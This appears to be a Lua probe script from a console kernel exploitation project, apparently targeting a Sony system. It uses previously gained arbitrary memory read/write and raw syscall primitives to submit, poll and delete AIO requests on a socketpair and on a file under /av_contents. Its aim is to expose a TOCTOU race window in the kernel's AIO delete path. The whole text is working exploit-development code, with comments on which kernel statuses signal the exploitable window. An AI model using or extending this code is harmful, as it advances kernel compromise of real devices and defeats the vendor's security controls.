-- CRASH_CLASS: LOW
-- PROBE 948a: aio on a regular file descriptor
--
-- Context: every aio probe so far submitted requests whose fd was a socketpair.
-- On this kernel the submit path never set the in-flight word ([W+4]) for those,
-- which is why delete never dropped its lock and the 14.20 TOCTOU window looked
-- absent.  But the 14.20 note says that window existed on <=14.10, and Sony does
-- not fix a dead path - so the missing ingredient may be the descriptor type.
-- A regular file on /av_contents is the classic worker-backed aio target, while
-- a socketpair is handled synchronously.
--
-- This probe repeats the exact submit/poll/delete sequence twice in one run:
--   [A] fd = socketpair   (the known baseline: delete after poll returns 0)
--   [B] fd = /av_contents file
-- and prints the poll states plus the delete element statuses for both.  The
-- signal to look for in [B] is 0x80020010 (in-flight refusal) on delete, or a
-- poll state 1/2 (queued/running) that [A] never shows.

print("=== PROBE 948a: AIO ON A FILE FD ===")
print("")

local function to_num(v)
    if type(v) == "table" then
        if v.tonumber then local n = v:tonumber() if n then return n end end
        if v.h then return v.h * 4294967296 + v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end
local function call(f, ...) local o, r = pcall(f, ...) if not o then return nil end return to_num(r) end

local pid = call(function() return native.fcall_with_rax(syscall.pipe.fn_addr, 20) end)
print("[0] pid=" .. tostring(pid))

local N = 2
local reqs = memory.alloc(0x28 * N)
local ids = memory.alloc(16)
local st = memory.alloc(16)
local buf = memory.alloc(0x2000)
local b = to_num(buf)
for i = 0, N * 0x28 - 4, 4 do wr(reqs + i, 0) end
for i = 0, 0x1FFC, 4 do wr(buf + i, 0x41410000 + i) end

-- open the two descriptor types
local sv = memory.alloc(8) zero(sv, 8)
call(function() return mk(135)(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local fd_pair = rd(sv)
local fpath = "/av_contents/content_tmp/aio948.bin"
local fd_file = call(function() return mk(5)(fpath, uint64(0x202), uint64(0x1FF)) end)
print(string.format("[0] socketpair=%s file=%s", tostring(fd_pair), tostring(fd_file)))
if type(fd_file) == "number" and fd_file >= 0 then
    call(function() return mk(4)(uint64(fd_file), uint64(buf), uint64(0x1000)) end)
end

local function setup(fd, tag)
    for i = 0, N - 1 do
        local r = reqs + i * 0x28
        wr(r + 0x08, 0x1000)                 -- length
        wr(r + 0x10, b % 4294967296)         -- buffer lo
        wr(r + 0x14, math.floor(b / 4294967296)) -- buffer hi
        wr(r + 0x20, fd)                     -- descriptor
    end
    print(string.format("[%s] requests point at fd %d", tag, fd))
end

local function run(tag, fd)
    setup(fd, tag)
    zero(ids, 16) zero(st, 16)
    local r1 = call(function() return mk(669)(uint64(0x1001), uint64(reqs), uint64(N), uint64(3), uint64(ids)) end)
    print(string.format("  %s submit rv=%s ids=%X,%X", tag, tostring(r1), rd(ids) or 0, rd(ids + 8) or 0))
    zero(st, 16)
    local r2 = call(function() return mk(664)(uint64(ids), uint64(N), uint64(st)) end)
    print(string.format("  %s poll   rv=%s states=%s,%s", tag, tostring(r2), tostring(rd(st)), tostring(rd(st + 4))))
    zero(st, 16)
    local r3 = call(function() return mk(662)(uint64(ids), uint64(N), uint64(st)) end)
    print(string.format("  %s delete rv=%s statuses=%X,%X", tag, tostring(r3), rd(st) or 0, rd(st + 4) or 0))
end

print("[A] control: socketpair")
if fd_pair then run("A", fd_pair) end
print("[B] file descriptor")
if type(fd_file) == "number" and fd_file >= 0 then run("B", fd_file) end
print("[C] repeat the file case immediately (slot reuse, generation +1)")
if type(fd_file) == "number" and fd_file >= 0 then run("C", fd_file) end

if type(fd_file) == "number" and fd_file >= 0 then call(function() return mk(6)(uint64(fd_file)) end) end
if fd_pair then call(function() return mk(6)(uint64(fd_pair)) end) end
print("")
print("=== PROBE 948a COMPLETE ===")
